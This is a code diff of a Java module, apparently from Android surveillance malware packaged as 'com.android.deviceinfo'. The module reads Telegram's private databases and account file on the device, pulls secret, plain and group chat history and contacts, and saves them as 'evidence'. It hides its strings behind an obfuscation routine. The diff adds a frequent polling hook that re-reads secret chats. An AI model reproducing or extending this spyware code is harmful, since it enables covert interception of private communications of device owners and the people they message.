@@ -21,8 +21,10 @@ import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
 
 import android.database.Cursor;
+import android.location.GpsStatus.Listener;
 import android.util.Base64;
 
+import com.android.deviceinfo.Standby;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordHashPairVisitor;
@@ -30,6 +32,7 @@ import com.android.deviceinfo.db.RecordHashtableIdVisitor;
 import com.android.deviceinfo.db.RecordStringVisitor;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
+import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
@@ -45,12 +48,12 @@ public class ChatTelegram extends SubModuleChat {
 		public String getName() {
 			return name + " " + last_name;
 		}
-
 	}
 
 	private static final String TAG = "ChatTelegram";
 
 	private static final int PROGRAM = 0x0e; // anche per addressbook
+	
 	String pObserving = M.e("org.telegram.messenger");
 	String dbFile = M.e("/data/data/org.telegram.messenger/files/cache4.db");
 	String dbAccountFile = M.e("/data/data/org.telegram.messenger/shared_prefs/userconfing.xml");
@@ -63,6 +66,10 @@ public class ChatTelegram extends SubModuleChat {
 	private Account account;
 
 	private GenericSqliteHelper helper;
+
+	private boolean firstTime = true;
+
+	private boolean started;
 
 	// private ByteBuffer in;
 
@@ -78,40 +85,52 @@ public class ChatTelegram extends SubModuleChat {
 
 	@Override
 	void notifyStopProgram(String processName) {
-		updateHistory();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notifyStopProgram) ");
+		}
+		updateHistory(false);
 	}
 
-	private void updateHistory() {
-		if (!readChatSemaphore.tryAcquire()) {
+	@Override
+	protected boolean frequentNotification(String processInfo) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (frequentNotification) ");
+		}
+		updateHistory(true);
+		return true;
+	}
+
+	private void updateHistory(boolean fast) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (updateHistory) " + fast);
+		}
+		if (!started || !readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (updateHistory), semaphore red");
 			}
 			return;
 		}
 		try {
-			lastTelegram = markup.unserialize(new Long(0));
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (start), read lastTelegram: " + lastTelegram);
 			}
 
-			Path.unprotect(dbAccountFile, 3, true);
+			helper = GenericSqliteHelper.open(dbFile);
 
-			Path.unprotect(dbFile, 3, true);
-			Path.unprotect(dbFile + "*", true);
+			if (Cfg.DEBUG) {
+				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
+			}
 
-			helper = GenericSqliteHelper.openCopy(dbFile);
-			helper.deleteAtEnd = false;
-
-			long lastmessage = readTelegramChatHistory();
+			long lastmessage = readTelegramChatHistory(helper, fast);
 
 			if (lastmessage > lastTelegram) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (start) serialize: %d", lastmessage);
 				}
 				markup.serialize(lastmessage);
+				lastTelegram = lastmessage;
 			}
-
-			helper.deleteDb();
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
@@ -124,7 +143,9 @@ public class ChatTelegram extends SubModuleChat {
 
 	@Override
 	protected void start() {
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (start) ");
+		}
 		if (!readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (start), semaphore red");
@@ -149,7 +170,7 @@ public class ChatTelegram extends SubModuleChat {
 
 			account = readAddressContacts();
 
-			long lastmessage = readTelegramChatHistory();
+			long lastmessage = readTelegramChatHistory(helper, false);
 
 			if (lastmessage > lastTelegram) {
 				if (Cfg.DEBUG) {
@@ -159,6 +180,7 @@ public class ChatTelegram extends SubModuleChat {
 			}
 
 			helper.deleteDb();
+			started = true;
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
@@ -197,14 +219,7 @@ public class ChatTelegram extends SubModuleChat {
 				}
 			};
 
-			// RecordHashPairVisitor visitorHash = new
-			// RecordHashPairVisitor("uid", "name");
 			helper.traverseRecords("users", visitor);
-
-			// for (String key : visitorHash.getMap().keySet()) {
-			// String value = visitorHash.get(key);
-			// }
-
 		}
 
 		return account;
@@ -260,29 +275,25 @@ public class ChatTelegram extends SubModuleChat {
 		}
 	}
 
-	private long readTelegramChatHistory() {
+
+	private long readTelegramChatHistory(GenericSqliteHelper helper, boolean fast) {
 
 		try {
-			Path.unprotect(dbFile, 3, true);
-			Path.unprotect(dbFile + "*", true);
-
-			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile);
-			helper.deleteAtEnd = false;
-
+			long lastmessageP = 0, lastmessageG = 0;
 			long lastmessageS = readTelegramSecureChatHistory(helper);
-			long lastmessageP = readTelegramPlainChatHistory(helper);
-			long lastmessageG = readTelegramGroupChatHistory(helper);
-			
-			helper.deleteDb();
+			if (!fast) {
+				lastmessageP = readTelegramPlainChatHistory(helper);
+				lastmessageG = readTelegramGroupChatHistory(helper);
+			}
 
-			return Math.max(lastmessageS, lastmessageP);
+			return Math.max(lastmessageS, Math.max(lastmessageP, lastmessageG));
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
 			}
+			return 0;
 		}
 
-		return 0;
 	}
 
 	private long readTelegramPlainChatHistory(GenericSqliteHelper helper) {
@@ -297,7 +308,9 @@ public class ChatTelegram extends SubModuleChat {
 			MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
 			long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastTelegram) }, visitor);
 
-			getModule().saveEvidence(messages);
+			if(!messages.isEmpty()){
+				getModule().saveEvidence(messages);
+			}
 			return lastmessage;
 
 		} catch (Exception ex) {
@@ -320,11 +333,13 @@ public class ChatTelegram extends SubModuleChat {
 		MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
 		long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastTelegram) }, visitor);
 
-		getModule().saveEvidence(messages);
+		if(!messages.isEmpty()){
+			getModule().saveEvidence(messages);
+		}
 		return lastmessage;
 	}
 
-	private long readTelegramGroupChatHistory(GenericSqliteHelper helper2) {
+	private long readTelegramGroupChatHistory(GenericSqliteHelper helper) {
 		// TODO Auto-generated method stub
 		return 0;
 	}
@@ -380,9 +395,8 @@ public class ChatTelegram extends SubModuleChat {
 
 	private ChatGroups getTelegramGroups(GenericSqliteHelper helper) {
 
-		
 		final ChatGroups groups = new ChatGroups();
-		RecordVisitor visitor = new RecordVisitor() { 
+		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
 			public long cursor(Cursor cursor) {
